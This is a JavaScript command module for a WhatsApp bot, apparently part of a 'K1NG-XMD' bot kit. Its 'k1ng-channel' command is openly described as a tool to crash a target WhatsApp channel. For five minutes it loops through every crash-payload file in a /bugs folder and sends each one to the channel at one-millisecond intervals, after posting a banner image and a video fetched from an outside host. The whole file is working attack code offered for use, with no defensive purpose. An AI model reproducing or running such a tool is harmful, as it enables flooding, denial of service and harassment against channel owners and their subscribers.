const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'k1ng-channel',
  desc: 'Crash WhatsApp Channel using payloads + photo + music (5min)',
  category: 'k1ng',
  react: '📡',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    if (cmdName !== 'k1ng-channel') return;

    const args = body.trim().split(/\s+/).slice(1);
    const channelId = args[0];

    if (!channelId || !channelId.includes('@broadcast')) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}k1ng-channel <channel-id>@broadcast`
      }, { quoted: mek });
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 No payloads found in /bugs folder.'
      }, { quoted: mek });
    }

    // ✅ Voye imaj 1.png
    const imagePath = path.join(__dirname, '../media/4.png');
    if (fs.existsSync(imagePath)) {
      const imageBuffer = fs.readFileSync(imagePath);
      await bot.sendMessage(channelId, {
        image: imageBuffer,
        caption: `🚨 k1ng-channel launched on ${channelId}\n🕒 Duration: 5min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`
      });
    }

    // ✅ Voye videyo apre sa
    await bot.sendMessage(channelId, {
      video: { url: 'https://files.catbox.moe/8e7mkq.mp4' },
      caption: '🎶 CRASH MODE by K1NG-XMD'
    });

    // ✅ Kòmanse atak 5 minit
    const endTime = Date.now() + (5 * 60 * 1000); // 5 minit

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, channelId);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 1)); // 0.001s delay
      }
    }

    await bot.sendMessage(from, {
      text: `✅ k1ng-channel attack completed on ${channelId}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
